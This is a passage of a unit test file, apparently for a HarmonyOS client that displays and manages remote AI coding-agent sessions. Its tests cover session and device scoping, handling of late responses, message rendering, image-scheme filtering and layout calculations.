    it('keepsCachedSessionsVisibleWhileAKnownDeviceIsBeingRevalidated', 0, () => {
      const cached = new CachedTaskListDevice();
      cached.deviceId = 'desktop-1';
      const session = new RemoteSession();
      session.id = 'cached-session';
      session.status = 'active';
      session.createdAt = '2026-08-10T01:00:00.000Z';
      cached.sessions = [session];
      const store = new TaskStore();
      store.hydrateTaskListSnapshot([cached]);

      const live = new DeviceView();
      live.deviceId = 'desktop-1';
      live.name = 'Live desktop';
      live.platform = 'darwin';
      live.online = true;
      live.remoteControlEnabled = true;
      store.mergeServerDevices([live]);

      expect(store.deviceList[0].online).assertEqual(true);
      expect(store.getSessions('desktop-1')[0].id).assertEqual('cached-session');
    });

    it('anchorsStreamingFollowToTheRealListTailAndRetriesAfterLayout', 0, () => {
      expect(messageListBottomIndex(true, 3, true, true, 2)).assertEqual(8);
      expect(messageListBottomIndex(false, 3, false, false, 0)).assertEqual(3);
      expect(firstVisibleMessageRenderIndex(true, 0, 12)).assertEqual(0);
      expect(firstVisibleMessageRenderIndex(true, 8, 12)).assertEqual(7);
      expect(firstVisibleMessageRenderIndex(false, 8, 12)).assertEqual(8);
      expect(firstVisibleMessageRenderIndex(true, 20, 12)).assertEqual(11);
      expect(firstVisibleMessageRenderIndex(true, 0, 0)).assertEqual(-1);
      expect(FOLLOW_LATEST_RETRY_DELAYS.length).assertEqual(3);
      expect(FOLLOW_LATEST_RETRY_DELAYS[0] < FOLLOW_LATEST_RETRY_DELAYS[1]).assertEqual(true);
      expect(FOLLOW_LATEST_RETRY_DELAYS[1] < FOLLOW_LATEST_RETRY_DELAYS[2]).assertEqual(true);
    });

    it('autofillsShortHistoryThenKeepsPrefetchingForRealUserReview', 0, () => {
      expect(INITIAL_HISTORY_AUTOFILL_PAGES).assertEqual(3);
      expect(shouldAutoLoadEarlier(
        false, 3, true, true, false, false, true, true, 2, 'first-1', '',
      )).assertEqual(true);
      expect(shouldAutoLoadEarlier(
        false, 0, true, true, false, false, true, true, 2, 'first-1', '',
      )).assertEqual(false);
      expect(shouldAutoLoadEarlier(
        false, 3, false, true, false, false, true, true, 2, 'first-1', '',
      )).assertEqual(false);
      expect(shouldAutoLoadEarlier(
        true, 0, false, true, false, false, true, true, 2, 'first-2', '',
      )).assertEqual(true);
      expect(shouldAutoLoadEarlier(
        true, 0, false, true, false, false, true, true, 2, 'first-2', 'first-2',
      )).assertEqual(false);
      expect(shouldAutoLoadEarlier(
        true, 0, false, true, false, true, true, true, 2, 'first-3', '',
      )).assertEqual(false);
      expect(historyGestureAllowsLoad(false, false, false)).assertEqual(true);
      expect(historyGestureAllowsLoad(true, false, false)).assertEqual(false);
      expect(historyGestureAllowsLoad(true, true, false)).assertEqual(true);
      expect(historyGestureAllowsLoad(true, true, true)).assertEqual(false);
    });

    it('stripsEditorLocationsBeforeReadingGeneratedFiles', 0, () => {
      const line = splitFileReferenceLocation('/tmp/服务商服务-Web对接指南.md:39');
      expect(line.path).assertEqual('/tmp/服务商服务-Web对接指南.md');
      expect(line.line).assertEqual(39);
      expect(line.column).assertEqual(0);

      const column = splitFileReferenceLocation('C:\\work\\src\\main.ts:12:3');
      expect(column.path).assertEqual('C:\\work\\src\\main.ts');
      expect(column.line).assertEqual(12);
      expect(column.column).assertEqual(3);

      const range = splitFileReferenceLocation('src/main.ets:10-20');
      expect(range.path).assertEqual('src/main.ets');
      expect(range.line).assertEqual(10);

      const ordinary = splitFileReferenceLocation('/tmp/report-2026.md');
      expect(ordinary.path).assertEqual('/tmp/report-2026.md');
      expect(ordinary.line).assertEqual(0);

      const remoteUrl = splitFileReferenceLocation('https://127.0.0.1:8080/report.md');
      expect(remoteUrl.path).assertEqual('https://127.0.0.1:8080/report.md');
      expect(remoteUrl.line).assertEqual(0);
      expect(isTextFileReference('/tmp/服务商服务-Web对接指南.md:32')).assertTrue();
      expect(isTextFileReference('/tmp/archive.zip:32')).assertFalse();
    });

    it('rejectsUnknownImageSchemesAndNormalizesSupportedCase', 0, () => {
      const tokens = tokenizeInline('![local](../screen.png) ![remote](HTTPS://example.com/a.png) <IMG SRC="XDT-IMAGE://art/a.png">');
      const urls: string[] = [];
      for (let i = 0; i < tokens.length; i++) {
        if (tokens[i].kind === 'image') urls.push(tokens[i].url);
      }
      expect(urls.length).assertEqual(3);
      expect(urls[1]).assertEqual('https://example.com/a.png');
      expect(urls[2]).assertEqual('xdt-image://art/a.png');

      const unsupported = tokenizeInline('![bad](mailto:test@example.com) <img src="custom://image">');
      let unsupportedImageCount = 0;
      let text = '';
      for (let i = 0; i < unsupported.length; i++) {
        if (unsupported[i].kind === 'image') unsupportedImageCount += 1;
        text += unsupported[i].value;
      }
      expect(unsupportedImageCount).assertEqual(0);
      expect(text.includes('mailto:test@example.com')).assertEqual(true);
      expect(text.includes('custom://image')).assertEqual(true);
    });

    it('rendersInlineBase64ImagesFromPersistedContent', 0, () => {
      const message = new RemoteMessage();
      message.id = 'user-base64';
      message.role = 'user';
      const content: Record<string, Object> = {};
      content['text'] = '查看内联图';
      const image: Record<string, Object> = {};
      image['base64'] = 'AQI=';
      image['mimeType'] = 'image/png';
      image['name'] = 'inline.png';
      content['images'] = [image];
      message.content = content;

      const items = buildRenderItems([message]);
      const rendered = items[0] as RenderMessageItem;
      expect(rendered.images.length).assertEqual(1);
      expect(rendered.images[0].url).assertEqual('data:image/png;base64,AQI=');
      expect(rendered.images[0].originalName).assertEqual('inline.png');
    });

    it('closesRunningProjectionForActivityAndStatusBoundaries', 0, () => {
      const store = new MessageStore();
      let runningTransitions = 0;
      const unsubscribe = store.onRunningStateChanged(() => {
        runningTransitions += 1;
      });
      const textData: Record<string, Object> = {};
      textData['text'] = '正在运行';
      const textEvent: Record<string, Object> = {};
      textEvent['type'] = 'text';
      textEvent['data'] = textData;
      store.handleMakerEvent('run-1', textEvent);
      expect(store.isSessionStreaming('run-1')).assertEqual(true);
      expect(store.isSessionRunning('run-1')).assertEqual(true);
      expect(runningTransitions).assertEqual(1);

      store.handleMakerEvent('run-1', textEvent);
      expect(runningTransitions).assertEqual(1);

      const completed: Record<string, Object> = {};
      completed['sessionId'] = 'run-1';
      completed['phase'] = 'completed';
      completed['isRunning'] = true;
      store.handleSessionActivity(completed);
      expect(store.isSessionStreaming('run-1')).assertEqual(false);
      expect(store.isSessionRunning('run-1')).assertEqual(false);
      expect(runningTransitions).assertEqual(2);

      const continuedStatusData: Record<string, Object> = {};
      continuedStatusData['isRunning'] = false;
      const continuedStatus: Record<string, Object> = {};
      continuedStatus['type'] = 'status';
      continuedStatus['data'] = continuedStatusData;
      continuedStatus['turnContinuationId'] = 1;
      store.handleMakerEvent('run-1', continuedStatus);
      expect(store.isSessionStreaming('run-1')).assertEqual(true);
      expect(runningTransitions).assertEqual(3);

      const continuedDone: Record<string, Object> = {};
      continuedDone['type'] = 'done';
      continuedDone['turnContinuationId'] = 1;
      store.handleMakerEvent('run-1', continuedDone);
      expect(store.isSessionStreaming('run-1')).assertEqual(true);

      const finalDone: Record<string, Object> = {};
      finalDone['type'] = 'done';
      store.handleMakerEvent('run-1', finalDone);
      expect(store.isSessionStreaming('run-1')).assertEqual(false);
      expect(runningTransitions).assertEqual(4);

      const reopenedData: Record<string, Object> = {};
      reopenedData['text'] = '再次运行';
      const reopened: Record<string, Object> = {};
      reopened['type'] = 'text';
      reopened['data'] = reopenedData;
      store.handleMakerEvent('run-1', reopened);
      const statusClosed: Record<string, Object> = {};
      statusClosed['sessionId'] = 'run-1';
      statusClosed['status'] = 'closed';
      store.handleMakerStatusChanged(statusClosed);
      expect(store.isSessionStreaming('run-1')).assertEqual(false);
      expect(runningTransitions).assertEqual(6);
      unsubscribe();
    });

    it('clearsMessageProjectionBeforeOpeningTheSameSessionOnAnotherDevice', 0, async () => {
      const store = new MessageStore();
      store.attach(new EmptyHistoryTestClient());
      expect(await store.openSession('desktop-a', 'same-session')).assertEqual(true);

      const message: Record<string, Object> = {};
      message['id'] = 'desktop-a-message';
      message['clientId'] = 'desktop-a-message';
      message['sessionId'] = 'same-session';
      message['role'] = 'user';
      message['content'] = '来自桌面 A';
      const push: Record<string, Object> = {};
      push['sessionId'] = 'same-session';
      push['message'] = message;
      store.handleSessionPush('desktop-a', 'local-db:messages:created', push);
      expect(store.getMessages('same-session').length).assertEqual(1);
      const liveData: Record<string, Object> = {};
      liveData['text'] = '桌面 A 正在运行';
      const liveEvent: Record<string, Object> = {};
      liveEvent['type'] = 'text';
      liveEvent['data'] = liveData;
      store.handleMakerEvent('same-session', liveEvent, '', 'desktop-a');
      expect(store.isSessionRunning('same-session', 'desktop-a')).assertEqual(true);
      const foreignData: Record<string, Object> = {};
      foreignData['text'] = '桌面 B 不应写入';
      const foreignEvent: Record<string, Object> = {};
      foreignEvent['type'] = 'text';
      foreignEvent['data'] = foreignData;
      store.handleMakerEvent('same-session', foreignEvent, '', 'desktop-b');
      expect(store.getStreaming('same-session')?.text ?? '').assertEqual('桌面 A 正在运行');
      expect(store.getMessages('same-session', 'desktop-b').length).assertEqual(0);
      expect(store.getMessagesWithStreaming('same-session', 'desktop-b').length).assertEqual(0);
      expect(store.getStreaming('same-session', 'desktop-b') === undefined).assertEqual(true);
      expect(store.hasMessageClientId('same-session', 'desktop-a-message', 'desktop-b'))
        .assertEqual(false);
      expect(await store.probeMessageClientId(
        'desktop-b', 'same-session', 'desktop-a-message', 20)).assertEqual('unknown');
      expect(store.isSessionOpen('same-session', 'desktop-b')).assertEqual(false);
      expect(store.isSessionStreaming('same-session', 'desktop-b')).assertEqual(false);
      expect(store.getTaskUpdates('same-session', 'desktop-b').size).assertEqual(0);

      expect(await store.openSession('desktop-b', 'same-session')).assertEqual(true);
      expect(store.getMessages('same-session').length).assertEqual(0);
      expect(store.isSessionRunning('same-session', 'desktop-a')).assertEqual(false);
      expect(store.isSessionRunning('same-session', 'desktop-b')).assertEqual(false);

      const deviceBData: Record<string, Object> = {};
      deviceBData['text'] = '桌面 B 正在运行';
      const deviceBEvent: Record<string, Object> = {};
      deviceBEvent['type'] = 'text';
      deviceBEvent['data'] = deviceBData;
      store.handleMakerEvent('same-session', deviceBEvent, '', 'desktop-b');
      expect(store.getMessagesWithStreaming('same-session', 'desktop-a').length).assertEqual(0);
      expect(store.getMessagesWithStreaming('same-session', 'desktop-b').length).assertEqual(1);
      expect(store.isSessionStreaming('same-session', 'desktop-b')).assertEqual(true);
    });

    it('dropsLateAroundResponseAfterSwitchingTheSameSessionToAnotherDevice', 0, async () => {
      const client = new DeferredAroundTestClient();
      const store = new MessageStore();
      store.attach(client);
      expect(await store.openSession('desktop-a', 'around-session')).assertEqual(true);

      const locating = store.loadAroundClientId(
        'desktop-a', 'around-session', 'late-around-message', 20);
      await client.aroundStarted;
      expect(await store.openSession('desktop-b', 'around-session')).assertEqual(true);

      const stale: Record<string, Object> = {};
      stale['id'] = 'late-around-message';
      stale['clientId'] = 'late-around-message';
      stale['sessionId'] = 'around-session';
      stale['role'] = 'assistant';
      stale['content'] = '旧设备定位结果';
      stale['createdAt'] = '2026-08-27T11:00:00.000Z';
      client.aroundResponse.resolve(successfulInvokeEnvelope([stale]));

      expect(await locating).assertEqual(false);
      expect(store.getMessages('around-session', 'desktop-b').length).assertEqual(0);
      expect(store.hasMessageClientId(
        'around-session', 'late-around-message', 'desktop-b')).assertEqual(false);
    });

    it('dropsLateAroundResponseAfterSwitchingBackToSameDevice', 0, async () => {
      const client = new DeferredAroundTestClient();
      const store = new MessageStore();
      store.attach(client);
      expect(await store.openSession('desktop-a', 'around-same-device-session')).assertEqual(true);

      const locating = store.loadAroundClientId(
        'desktop-a', 'around-same-device-session', 'late-around-same-device-message', 20);
      await client.aroundStarted;
      expect(await store.openSession('desktop-b', 'around-same-device-session')).assertEqual(true);
      expect(await store.openSession('desktop-a', 'around-same-device-session')).assertEqual(true);

      const stale: Record<string, Object> = {};
      stale['id'] = 'late-around-same-device-message';
      stale['clientId'] = 'late-around-same-device-message';
      stale['sessionId'] = 'around-same-device-session';
      stale['role'] = 'assistant';
      stale['content'] = '同设备旧定位结果';
      stale['createdAt'] = '2026-08-27T11:01:00.000Z';
      client.aroundResponse.resolve(successfulInvokeEnvelope([stale]));

      expect(await locating).assertEqual(false);
      expect(store.getMessages('around-same-device-session', 'desktop-a').length).assertEqual(0);
      expect(store.hasMessageClientId(
        'around-same-device-session', 'late-around-same-device-message', 'desktop-a'))
        .assertEqual(false);
    });

    it('dropsLateRecoveryWindowAfterConnectionGenerationChanges', 0, async () => {
      const client = new RecoveryTestClient();
      const store = new MessageStore();
      store.attach(client);
      expect(await store.openSession('device-recovery', 'recovery-session')).assertEqual(true);

      const healing = store.resubscribeAndHeal('device-recovery', 'recovery-session');
      await client.historyStarted;
      store.invalidateLiveTailTrust();

      const staleRow: Record<string, Object> = {};
      staleRow['id'] = 'stale-recovery-row';
      staleRow['clientId'] = 'stale-recovery-row';
      staleRow['sessionId'] = 'recovery-session';
      staleRow['role'] = 'assistant';
      staleRow['content'] = '旧连接返回的消息';
      staleRow['createdAt'] = '2026-08-27T10:00:00.000Z';
      const staleRows: Object[] = [staleRow];
      client.staleHistory.resolve(successfulInvokeEnvelope(staleRows));
      await healing;

      expect(store.getMessages('recovery-session').length).assertEqual(0);
      expect(store.isSessionOpen('recovery-session')).assertEqual(true);
    });

    it('singleFlightsActiveRefreshAndDropsItAfterDeviceInvalidation', 0, async () => {
      const client = new ActiveSnapshotTestClient();
      const store = new TaskStore();
      store.attach(client);

      const device = new DeviceView();
      device.deviceId = 'active-device';
      device.name = 'Active desktop';
      device.platform = 'darwin';
      device.online = true;
      device.remoteControlEnabled = true;
      store.mergeServerDevices([device]);

      const session = new RemoteSession();
      session.id = 'active-session';
      session.status = 'active';
      store.upsertSession(device.deviceId, session);

      const first = store.refreshActiveSessions(device.deviceId);
      const second = store.refreshActiveSessions(device.deviceId);
      expect(client.activeCalls).assertEqual(1);

      const disabled = new DeviceView();
      disabled.deviceId = device.deviceId;
      disabled.name = device.name;
      disabled.platform = device.platform;
      // 保持在线但撤销远程控制，避免 mergeServerDevices 的旧离线快照保护掩盖撤权。
      disabled.online = true;
      disabled.remoteControlEnabled = false;
      store.mergeServerDevices([disabled]);

      const staleActivity: Record<string, Object> = {};
      staleActivity['sessionId'] = session.id;
      staleActivity['phase'] = 'running';
      store.handleSessionsPush(device.deviceId, DlChannels.SESSION_ACTIVITY, staleActivity);
      expect(store.getLiveActivity(session.id, device.deviceId) === null).assertEqual(true);

      const activeRow: Record<string, Object> = {};
      activeRow['sessionId'] = session.id;
      activeRow['isTurnRunning'] = true;
      client.activeResponse.resolve(successfulInvokeEnvelope([activeRow]));
      await first;
      await second;

      expect(store.getSessions(device.deviceId).length).assertEqual(0);
      expect(store.getLiveActivity(session.id, device.deviceId) === null).assertEqual(true);
    });

    it('reconcilesOmittedInactiveSessionsFromTheActiveSnapshot', 0, async () => {
      const client = new ActiveSnapshotTestClient();
      const store = new TaskStore();
      store.attach(client);

      const device = new DeviceView();
      device.deviceId = 'active-device-2';
      device.name = 'Active desktop 2';
      device.platform = 'darwin';
      device.online = true;
      device.remoteControlEnabled = true;
      store.mergeServerDevices([device]);

      const session = new RemoteSession();
      session.id = 'active-session-2';
      session.status = 'active';
      store.upsertSession(device.deviceId, session);
      const activity: Record<string, Object> = {};
      activity['sessionId'] = session.id;
      activity['phase'] = 'running';
      activity['attention'] = false;
      store.handleSessionsPush(device.deviceId, DlChannels.SESSION_ACTIVITY, activity);
      expect(store.getLiveActivity(session.id, device.deviceId) === null).assertEqual(false);

      client.activeResponse.resolve(successfulInvokeEnvelope([]));
      await store.refreshActiveSessions(device.deviceId);

      expect(client.activeCalls).assertEqual(1);
      expect(store.getLiveActivity(session.id, device.deviceId) === null).assertEqual(true);
    });

    it('keepsIdenticalSessionIdsAndActivityScopedAcrossDevices', 0, () => {
      const store = new TaskStore();
      const deviceA = new DeviceView();
      deviceA.deviceId = 'activity-device-a';
      deviceA.name = 'Activity desktop A';
      deviceA.platform = 'darwin';
      deviceA.online = true;
      deviceA.remoteControlEnabled = true;
      const deviceB = new DeviceView();
      deviceB.deviceId = 'activity-device-b';
      deviceB.name = 'Activity desktop B';
      deviceB.platform = 'darwin';
      deviceB.online = true;
      deviceB.remoteControlEnabled = true;
      store.mergeServerDevices([deviceA, deviceB]);

      const sessionA = new RemoteSession();
      sessionA.id = 'same-session-id';
      sessionA.status = 'active';
      const sessionB = new RemoteSession();
      sessionB.id = sessionA.id;
      sessionB.status = 'active';
      store.upsertSession(deviceA.deviceId, sessionA);
      store.upsertSession(deviceB.deviceId, sessionB);

      const activityA: Record<string, Object> = {};
      activityA['sessionId'] = sessionA.id;
      activityA['phase'] = 'running';
      const activityB: Record<string, Object> = {};
      activityB['sessionId'] = sessionB.id;
      activityB['phase'] = 'running';
      store.handleSessionsPush(deviceA.deviceId, DlChannels.SESSION_ACTIVITY, activityA);
      store.handleSessionsPush(deviceB.deviceId, DlChannels.SESSION_ACTIVITY, activityB);

      expect(store.getLiveActivity(sessionA.id, deviceA.deviceId) === null).assertEqual(false);
      expect(store.getLiveActivity(sessionB.id, deviceB.deviceId) === null).assertEqual(false);

      const revokedA = new DeviceView();
      revokedA.deviceId = deviceA.deviceId;
      revokedA.name = deviceA.name;
      revokedA.platform = deviceA.platform;
      revokedA.online = true;
      revokedA.remoteControlEnabled = false;
      store.mergeServerDevices([revokedA, deviceB]);
      expect(store.getLiveActivity(sessionA.id, deviceA.deviceId) === null).assertEqual(true);
      expect(store.getLiveActivity(sessionB.id, deviceB.deviceId) === null).assertEqual(false);
    });

    it('keepsReliableGenerationMetricsAndClearsThemAtTheNextTurn', 0, () => {
      const store = new MessageStore();
      const liveData: Record<string, Object> = {};
      liveData['isRunning'] = true;
      liveData['outputTokens'] = 40;
      liveData['generationDurationMs'] = 800;
      liveData['generationActive'] = true;
      liveData['generationReliable'] = true;
      liveData['status'] = 'Generating';
      const live: Record<string, Object> = {};
      live['type'] = 'status';
      live['data'] = liveData;
      store.handleMakerEvent('generation-1', live);

      const running = store.getGenerationStatus('generation-1');
      expect(running.isRunning).assertEqual(true);
      expect(running.outputTokens).assertEqual(40);
      expect(running.generationDurationMs).assertEqual(800);
      expect(running.generationActive).assertEqual(true);
      expect(running.generationReliable).assertEqual(true);
      expect(generationStatusLabel(running)).assertEqual('50 tok/s');

      const continuedData: Record<string, Object> = {};
      continuedData['isRunning'] = false;
      const continued: Record<string, Object> = {};
      continued['type'] = 'status';
      continued['data'] = continuedData;
      continued['turnContinuationId'] = 2;
      store.handleMakerEvent('generation-1', continued);
      expect(store.getGenerationStatus('generation-1').isRunning).assertEqual(true);
      expect(store.getGenerationStatus('generation-1').outputTokens).assertEqual(40);

      const completedData: Record<string, Object> = {};
      completedData['isRunning'] = false;
      const completed: Record<string, Object> = {};
      completed['type'] = 'status';
      completed['data'] = completedData;
      store.handleMakerEvent('generation-1', completed);
      const finished = store.getGenerationStatus('generation-1');
      expect(finished.isRunning).assertEqual(false);
      expect(finished.generationActive).assertEqual(false);
      expect(finished.outputTokens).assertEqual(40);
      expect(generationStatusLabel(finished)).assertEqual('');

      const nextTurnData: Record<string, Object> = {};
      nextTurnData['isRunning'] = true;
      nextTurnData['status'] = 'Thinking';
      const nextTurn: Record<string, Object> = {};
      nextTurn['type'] = 'status';
      nextTurn['data'] = nextTurnData;
      store.handleMakerEvent('generation-1', nextTurn);
      const reset = store.getGenerationStatus('generation-1');
      expect(reset.outputTokens).assertEqual(0);
      expect(reset.generationDurationMs).assertEqual(0);
      expect(reset.generationActive).assertEqual(false);
      expect(reset.generationReliable).assertEqual(true);
      expect(generationStatusLabel(reset)).assertEqual('');
    });

    it('fallsBackToCumulativeTokensWhenGenerationIsUnreliable', 0, () => {
      const status = new SessionGenerationStatus();
      status.isRunning = true;
      status.outputTokens = 1250;
      status.generationDurationMs = 500;
      status.generationActive = true;
      status.generationReliable = false;
      expect(generationStatusLabel(status)).assertEqual('1.25K tokens');

      status.generationReliable = true;
      status.generationActive = false;
      expect(generationStatusLabel(status)).assertEqual('1.25K tokens');
    });

    it('surfacesManagedToolResultImagesOutsideWorkGroup', 0, () => {
      const user = new RemoteMessage();
      user.id = 'user-media';
      user.role = 'user';
      user.content = '生成截图';

      const tool = new RemoteMessage();
      tool.id = 'tool-media';
      tool.role = 'tool_use';
      tool.toolUseId = 'use-media';
      const toolContent: Record<string, Object> = {};
      toolContent['toolUseId'] = 'use-media';
      toolContent['toolName'] = 'image_generate';
      toolContent['input'] = '{}';
      tool.content = toolContent;

      const result = new RemoteMessage();
      result.id = 'result-media';
      result.role = 'tool_result';
      result.toolUseId = 'use-media';
      result.content = JSON.stringify({
        xdt_image_urls: ['xdt-image://art/a.png', 'cindy-media://blobs/b.png'],
      });

      const answer = new RemoteMessage();
      answer.id = 'answer-media';
      answer.role = 'assistant';
      answer.content = '已生成';

      const items = buildRenderItems([user, tool, result, answer]);
      let media: RenderToolMediaItem | undefined = undefined;
      for (let i = 0; i < items.length; i++) {
        if (items[i].type === 'tool_media') media = items[i] as RenderToolMediaItem;
      }
      expect(media !== undefined).assertEqual(true);
      expect(media?.images.length).assertEqual(2);
      expect(media?.images[0].url).assertEqual('xdt-image://art/a.png');
    });

    it('settlesUnfinishedToolsOutsideTheActiveTail', 0, () => {
      const firstUser = new RemoteMessage();
      firstUser.id = 'user-1';
      firstUser.role = 'user';
      firstUser.content = 'first turn';

      const oldTool = new RemoteMessage();
      oldTool.id = 'tool-old';
      oldTool.role = 'tool_use';
      const oldToolContent: Record<string, Object> = {};
      oldToolContent['toolUseId'] = 'old-use';
      oldToolContent['toolName'] = 'Read';
      oldTool.content = oldToolContent;

      const secondUser = new RemoteMessage();
      secondUser.id = 'user-2';
      secondUser.role = 'user';
      secondUser.content = 'second turn';

      const activeTool = new RemoteMessage();
      activeTool.id = 'tool-active';
      activeTool.role = 'tool_use';
      const activeToolContent: Record<string, Object> = {};
      activeToolContent['toolUseId'] = 'active-use';
      activeToolContent['toolName'] = 'Bash';
      activeTool.content = activeToolContent;

      const items = buildRenderItems([firstUser, oldTool, secondUser, activeTool], true);
      const oldWork = items[1] as RenderWorkGroupItem;
      const activeWork = items[3] as RenderWorkGroupItem;
      const oldGroup = oldWork.children[0] as RenderToolGroupItem;
      const activeGroup = activeWork.children[0] as RenderToolGroupItem;

      expect(oldGroup.tools[0].hasResult).assertEqual(true);
      expect(activeGroup.tools[0].hasResult).assertEqual(false);
      expect(activeWork.isStreaming).assertEqual(true);
    });

    it('parsesComposerContextSessionAndGoalState', 0, () => {
      const rawSession: Record<string, Object> = {};
      rawSession['id'] = 'session-1';
      rawSession['planModeEnabled'] = true;
      const session = parseSession(rawSession);

      const rawGoal: Record<string, Object> = {};
      rawGoal['sessionId'] = 'session-1';
      rawGoal['status'] = 'active';
      rawGoal['objective'] = 'Finish the Harmony composer';
      rawGoal['turnsUsed'] = 4;
      rawGoal['tokensUsed'] = 1200;
      rawGoal['maxTurns'] = 12;
      rawGoal['noProgressLimit'] = 3;
      const goal = parseGoalModeState(rawGoal);

      expect(session.planModeEnabled).assertEqual(true);
      expect(goal?.currentTurns).assertEqual(4);
      expect(goal?.cumulativeTokens).assertEqual(1200);
      expect(goal?.maxTurns).assertEqual(12);
      expect(goal?.budgetTokens).assertEqual(-1);
    });

    it('keepsGoalStatusScopedToItsSourceDevice', 0, () => {
      const store = new GoalStore();
      const activeGoal: Record<string, Object> = {};
      activeGoal['status'] = 'active';
      activeGoal['objective'] = '来自 A';
      const activePush: Record<string, Object> = {};
      activePush['sessionId'] = 'same-goal-session';
      activePush['goal'] = activeGoal;
      store.handleStatusChanged(activePush, 'desktop-a');

      const pausedGoal: Record<string, Object> = {};
      pausedGoal['status'] = 'paused';
      pausedGoal['objective'] = '来自 B';
      const pausedPush: Record<string, Object> = {};
      pausedPush['sessionId'] = 'same-goal-session';
      pausedPush['goal'] = pausedGoal;
      store.handleStatusChanged(pausedPush, 'desktop-b');

      expect(store.getState('same-goal-session', 'desktop-a')?.status).assertEqual('active');
      expect(store.getState('same-goal-session', 'desktop-b')?.status).assertEqual('paused');
      expect(store.getState('same-goal-session', 'desktop-a')?.objective).assertEqual('来自 A');
    });

    it('usesMediumWidthSplitLayoutAndClampsDrag', 0, () => {
      expect(isWideTaskLayout(639, 400)).assertEqual(false);
      expect(isWideTaskLayout(640, 400)).assertEqual(true);
      expect(isWideTaskLayout(900, 1200, TASK_FOLD_STATUS_EXPANDED)).assertEqual(false);
      expect(isWideTaskLayout(1200, 900, TASK_FOLD_STATUS_EXPANDED)).assertEqual(true);
      expect(isWideTaskLayout(1200, 900, TASK_FOLD_STATUS_FOLDED)).assertEqual(false);
      expect(isWideTaskLayout(1200, 900, TASK_FOLD_STATUS_HALF_FOLDED)).assertEqual(false);
      expect(isWideTaskLayout(1200, 900, 0)).assertEqual(false);
      expect(taskListPaneWidth(900, TASK_SPLIT_DEFAULT_RATIO)).assertEqual(300);
      expect(taskListPaneWidth(640, TASK_SPLIT_DEFAULT_RATIO)).assertEqual(300);
      expect(taskDetailPaneWidth(900, TASK_SPLIT_DEFAULT_RATIO)).assertEqual(600);
      expect(taskDetailPaneWidth(640, TASK_SPLIT_DEFAULT_RATIO)).assertEqual(340);
      expect(taskListPaneWidth(1200, 0.4)
        + taskDetailPaneWidth(1200, 0.4)).assertEqual(1200);
      expect(taskDetailKeyboardInset(639, 400, -1, 320)).assertEqual(0);
      expect(taskDetailKeyboardInset(900, 600, -1, 320)).assertEqual(320);
      expect(taskDetailKeyboardInset(640, 900, -1, 320)).assertEqual(0);
      expect(taskDetailKeyboardInset(900, 600, TASK_FOLD_STATUS_FOLDED, 320)).assertEqual(0);
      expect(taskDetailKeyboardInset(900, 600, -1, -1)).assertEqual(0);

      const dragged = taskSplitRatioForDrag(900, TASK_SPLIT_DEFAULT_RATIO, 200);
      expect(dragged > 0.55 && dragged <= 0.6).assertEqual(true);
      expect(taskSplitRatioForDrag(900, TASK_SPLIT_DEFAULT_RATIO, -500)).assertEqual(0.25);
    });

    it('handsCurrentTaskBackToSplitLayoutOnlyOnce', 0, () => {
      handoffTaskSplitRouteSelection('device-1', 'session-1', 'message-1');
      const selection = consumeTaskSplitRouteSelection();
      expect(selection?.deviceId).assertEqual('device-1');
      expect(selection?.sessionId).assertEqual('session-1');
      expect(selection?.messageClientId).assertEqual('message-1');
      expect(consumeTaskSplitRouteSelection()).assertNull();
    });

    it('projectsTaskListCopyAndRelativeTimeLikeMobile', 0, () => {
      const session = new RemoteSession();
      session.title = 'New Maker';
      session.status = 'active';
      expect(taskDisplayTitle(session)).assertEqual('未命名任务');
      expect(taskPreviewText('  first\n  second  ')).assertEqual('first second');
      expect(taskProjectName('C:\\work\\cindy-harmony\\')).assertEqual('cindy-harmony');
      expect(taskProjectName('C:\\work\\cindy-harmony\\.cindy-worktrees\\feature-one')).assertEqual('cindy-harmony');
      expect(taskProjectName('/work/app/.claude/worktrees/feature-two')).assertEqual('app');
      expect(taskProjectKey('device-1', 'C:\\Work\\App\\')).assertEqual('device-1:c:/work/app');

      session.userSendAt = '2026-08-01T10:00:00.000Z';
      session.updatedAt = '2026-08-01T11:00:00.000Z';
      expect(taskActivityAt(session)).assertEqual('2026-08-01T10:00:00.000Z');

      const now = Date.parse('2026-08-01T12:00:00.000Z');
      expect(taskRelativeTime('2026-08-01T11:59:45.000Z', now)).assertEqual('刚刚');
      expect(taskRelativeTime('2026-08-01T11:35:00.000Z', now)).assertEqual('25 分钟');
      expect(taskRelativeTime('2026-07-30T12:00:00.000Z', now)).assertEqual('2 天');
      expect(taskVisibleOnHome(session)).assertEqual(true);
      session.orcaRole = 'worker';
      expect(taskVisibleOnHome(session)).assertEqual(false);
    });

    it('keepsTaskListRunningAheadOfStaleCompletedAttention', 0, () => {
      expect(resolveTaskRightStatus('completed', true, 0, true)).assertEqual('running');
      expect(resolveTaskRightStatus('completed', true, 0, false)).assertEqual('done');
      expect(resolveTaskRightStatus('error', true, 0, true)).assertEqual('error');
      expect(resolveTaskRightStatus('completed', true, 1, true)).assertEqual('waiting');
    });

    it('showsTaskListFloatingBarAtBothScrollBoundaries', 0, () => {
      expect(taskListShouldShowFloatingBarAtBoundary(0, false)).assertEqual(true);
      expect(taskListShouldShowFloatingBarAtBoundary(0, true)).assertEqual(true);
      expect(taskListShouldShowFloatingBarAtBoundary(160, true)).assertEqual(true);
      expect(taskListShouldShowFloatingBarAtBoundary(160, false)).assertEqual(false);
    });

    it('hidesAndShowsDetailComposerAfterClearDirectionalScroll', 0, () => {
      let update = updateComposerScrollVisibility(0, -4, true);
      expect(update.action).assertEqual(COMPOSER_SCROLL_ACTION_NONE);
      expect(update.intent).assertEqual(-4);

      update = updateComposerScrollVisibility(update.intent, -6, true);
      expect(update.action).assertEqual(COMPOSER_SCROLL_ACTION_HIDE);
      expect(update.intent).assertEqual(0);

      update = updateComposerScrollVisibility(0, 8, true);
      expect(update.action).assertEqual(COMPOSER_SCROLL_ACTION_SHOW);
      expect(update.intent).assertEqual(0);
    });

    it('resetsComposerScrollIntentAcrossDirectionsAndProtectsEditing', 0, () => {
      let update = updateComposerScrollVisibility(-7, 2, true);
      expect(update.action).assertEqual(COMPOSER_SCROLL_ACTION_NONE);
      expect(update.intent).assertEqual(2);

      update = updateComposerScrollVisibility(update.intent, -11, false);
      expect(update.action).assertEqual(COMPOSER_SCROLL_ACTION_SHOW);
      expect(update.intent).assertEqual(0);
    });

    it('rebuildsTaskListRowsWhenVisibleSessionStateChanges', 0, () => {
      const session = new RemoteSession();
      session.id = 'session-stable-id';
      session.title = '旧标题';
      session.preview = '正在检查';
      session.agentKind = 'codex';
      session.status = 'active';
